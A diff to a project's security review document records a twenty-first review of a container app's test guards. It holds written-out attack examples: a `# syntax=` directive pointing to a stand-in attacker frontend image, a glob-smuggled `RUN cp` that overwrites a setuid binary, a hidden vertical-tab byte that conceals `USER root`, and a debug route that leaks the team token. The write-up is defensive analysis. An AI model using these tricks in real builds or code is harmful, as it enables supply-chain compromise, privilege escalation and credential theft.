@@ -114,6 +114,16 @@ the assessment store.
 | Nothing writes over a binary a hardening step names, at any WORKDIR | `Dockerfile` | `test_nothing_writes_over_a_binary_the_hardening_steps_depend_on` |
 | No instruction fetches from the network or rewrites the shipped PATH | `Dockerfile` | `test_no_instruction_fetches_from_the_network_or_rewrites_the_shipped_path` |
 | Exactly one environment file ships, the root example | `scripts/package-appstore.sh` | `test_the_example_environment_file_carries_no_real_value` |
+| The Dockerfile parser uses BuildKit's line model, not Python's | `tests/test_boot_contract.py` | `test_the_parser_follows_buildkit_continuation_semantics` |
+| No parser directive survives, so no build frontend can be substituted | `Dockerfile` | `test_no_parser_directive_survives_the_first_line` |
+| A RUN building a path opaquely is refused, glob and brace included | `tests/test_boot_contract.py` | `test_the_write_guard_refuses_a_path_built_opaquely` |
+| Every route outside the probe set carries the token gate | `src/pree/app.py` | `test_every_route_outside_the_probe_set_carries_the_token_gate` |
+| No route answers an unauthenticated caller outside the probe set | `src/pree/app.py` | `test_no_route_answers_an_unauthenticated_caller_outside_the_probe_set` |
+| The team token reaches no response body and no log record | `src/pree/app.py` | `test_the_team_token_reaches_no_response_body_and_no_log_record` |
+| The 405 Allow set is derived from the route table, not a hand-written map | `src/pree/app.py` | `test_every_method_not_allowed_names_the_methods_that_are` |
+| A colon sentence pairs with the bullet, fence or row that follows it | `tests/test_boot_contract.py` | `test_the_claim_unit_splitter_pairs_a_colon_sentence_with_what_follows` |
+| A refused package run leaves no uploadable artefact | `scripts/package-appstore.sh` | `test_a_refused_tree_leaves_no_archive_at_the_upload_path` |
+| The upload archive is flat, with the source and the suite at its root | `scripts/package-appstore.sh` | `test_the_archive_is_flat_and_carries_the_files_the_platform_builds_from` |
 
 ## Deliberately accepted risks
 
@@ -988,6 +998,90 @@ joiner and the splitter each have a test that fails when they change. That is th
 between a guard and a guard that can be trusted, and it should have been there fifteen rounds ago.
 
 Each of these now has a named regression test in the control table above.
+
+### Twenty-first review: one blocker, four majors, five minors
+
+The blocker was the previous round's blocker, one byte to the side. The continuation rule was
+BuildKit's, correctly cited, and the LINE MODEL underneath it was Python's: `str.splitlines()`
+breaks a line at VT, FF, 0x1c to 0x1e, NEL and U+2028, and a blanket `rstrip()` also takes off
+NBSP and the Unicode spaces, where docker splits on `\n` alone and trims `\r\n` alone, tolerating
+only a space or a tab after the backslash. So a `LABEL` ending in a backslash and a 0x0b was a
+continuation here and a complete instruction there, and the `USER root` on the next line vanished
+from every assertion while the shipped image ran as root: 292 tests green, and a 0x0b that renders
+as nothing in an editor and in a diff. The parser splits on `\n` and trims `\r\n` now, and the
+test asserts ten carriers, three padded continuations and a CRLF file, because fixing the rule
+without fixing the model is what produced this finding.
+
+The `*` omission is the same lesson at the character level. The refusal listed `$`, a backtick,
+`?` and brackets; `RUN cp /usr/b*n/true /usr/b*n/find` passed 292 of 292, resolved to
+/usr/bin/find, and shipped every setuid and setgid bit in the base image. `?` refused and `*` not
+is the same attack one metacharacter over. The comment justifying the list was also wrong on its
+own terms: it argued the cost of refusing `*` against the vetted RUNs, and a vetted RUN never
+reaches that loop because the exact-text exemption returns first. Refusing `*`, `{` and `}` costs
+nothing at all.
+
+The third major is the one worth reading twice. Round twenty's structural fix made the parser
+testable and added three tests. One of them, the test written specifically to prove the opaque-path
+refusal works, asserted that its own four string constants each contained one of the refused
+characters. That is a tautology over literals: it is true whatever the guard does, and deleting the
+refusal loop outright left all 292 tests green. The remedy carried the identical defect as the
+thing it was remedying. The guard is a callable helper now, `_binary_write_offences`, fed synthetic
+Dockerfile text, and thirteen fabrications turn it red including the glob above.
+
+The parser-directive guard checked a directive's name and never its value, so
+`# syntax=attacker.example/evil-frontend:latest` passed the whole suite. A syntax value is a build
+FRONTEND image: BuildKit pulls it, hands it the Dockerfile and the whole build context, and
+whatever it emits is the image, which would make every text assertion in the boot contract a
+statement about a document nothing executes. The shipped value was also `docker/dockerfile:1`, a
+floating tag, in a file whose own header explains why its base images are pinned by digest.
+Pinning the frontend by digest would have closed it; removing it closes it and removes a network
+pull from the build. Nothing here needs a BuildKit-only feature, so the directive is gone from the
+Dockerfile and every directive is refused, which is wider than BuildKit's own table on purpose:
+this parser cannot tell a comment from a directive docker learns to honour in a later release.
+
+Nothing walked the route table. Gating was asserted route by route, by hand, and
+`@app.post("/v1/debug")` returning the team token with no dependency passed 292 of 292 without
+tripping the coverage floor: one line, and the shared credential goes to any unauthenticated
+client on the internet with a green gate. The shipped table was correct, so this was a missing
+regression control rather than a live hole, which is exactly the kind of gap that becomes a live
+hole on somebody's Friday afternoon. Three tests walk `app.routes` now: the gate by introspection
+over the whole dependant tree, the gate by asking every method of every route without a token, and
+the token appearing in no response body and no log record. The `Allow` expectation is derived from
+the table too, where it was a hand-written map over five of the nine paths.
+
+Five minors, four of them in the same guard. The claim-unit splitter read `pending` before it was
+ever assigned, so any document opening with a table row raised `UnboundLocalError`: fail-closed, a
+crash rather than a silent pass, but a crashing guard proves nothing and neither the linter nor the
+type checker saw it. Its colon pairing reached a table row and nothing else, so a wrong token floor
+written as a `●` bullet, a fenced block, or a heading and then a row all passed, and the house
+style bullets with `●`, which made the likeliest of those shapes the one it missed. The pairing
+crosses three units now, bounded because pairing indefinitely runs a colon sentence together with
+the next section and starts flagging true statements, and the splitter is tested on synthetic
+documents rather than only on this repository's.
+
+`scripts/package-appstore.sh` wrote the archive before any check ran. Every refusal exits 1, and
+each one left the rejected zip sitting at the path the script's own output tells a human to upload:
+measured with a planted `docs/deploy_key.txt`, exit 1 and an archive on disk containing it. It
+stages to a partial path and moves into place after the last check, with a trap covering the
+interrupted run. That script has taken a finding in six of the last seven reviews and had no
+automated test at all; it has three now, and the refusal path is one of them.
+
+Two comments in `src/pree/app.py` asserted controls that are not in the code: an explicit
+operation id that is never passed, left behind when the fix moved from pinning an id to leaving the
+schema, and two different middleware layers each labelled "second-outermost". Both corrected. A
+comment describing a control that does not exist is the same defect class as a policy paragraph
+recording a fix that did not land, and this file has already had two of those.
+
+The pattern across this round is worth naming plainly, because it is the third round running that
+it holds. The application's own boundaries were probed again - the full method and path matrix
+against a running server in production posture, prototype pollution, oversized bodies, token
+prefixes, traversal keys, actor injection, cross-origin preflights - and held. Every finding was in
+the layer built to prove they hold, and the two most serious were in controls added the round
+before to close findings of exactly that shape. Making the parser testable was the right structural
+move and it was not enough on its own: a test can be added to a testable parser and still assert
+nothing. What each of this round's fixes has in common is that the control is now invoked on
+synthetic input whose expected outcome is known, rather than described and then measured against
+the one document that happens to be correct.
 
 ## Not accepted, and why it is not a risk here
 
